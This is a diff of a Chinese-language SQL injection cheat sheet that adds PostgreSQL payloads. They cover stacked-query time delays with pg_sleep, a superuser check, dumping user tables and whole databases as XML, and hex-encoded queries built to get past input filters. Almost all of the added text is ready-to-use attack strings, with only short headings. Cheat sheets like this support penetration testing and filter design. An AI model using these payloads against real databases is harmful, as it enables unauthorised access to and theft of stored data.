@@ -322,7 +322,7 @@ id=1/*comment*/and/**/1=1/**/--
 id=(1)and(1)=(1)--
 ```
 
-|描述|查询语句|
+|DBMS|ASCII字符|
 |----|----|
 |MySQL V3|01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0|
 |MySQL V5|09, 0A, 0B, 0C, 0D, A0, 20|
@@ -467,4 +467,36 @@ SELECT CHR(65)||CHR(66)||CHR(67);
 ```sql
 SELECT $$This is a string$$
 SELECT $TAG$This is another string$TAG$
+```
+
+#### 堆叠查询
+
+通过时间延迟滥用堆叠查询
+```sql
+id=1; select pg_sleep(10);-- -
+1; SELECT case when (SELECT current_setting('is_superuser'))='on' then pg_sleep(10) end;-- -
+```
+
+#### XML
+
+查询到XML中
+```sql
+SELECT query_to_xml('select * from pg_user',true,true,'');
+```
+
+数据库以XML格式转储
+```sql
+SELECT database_to_xml(true,true,'');
+```
+
+#### 十六进制字符串
+
+```sql
+select encode('select cast(string_agg(table_name, '','') as int) from information_schema.tables', 'hex'), convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573', 'UTF8');
+
+# Bypass via stacked queries + error based + query_to_xml with hex
+;select query_to_xml(convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573','UTF8'),true,true,'')-- -h
+
+# Bypass via boolean + error based + query_to_xml with hex
+1 or '1' = (query_to_xml(convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573','UTF8'),true,true,''))::text-- -
 ```
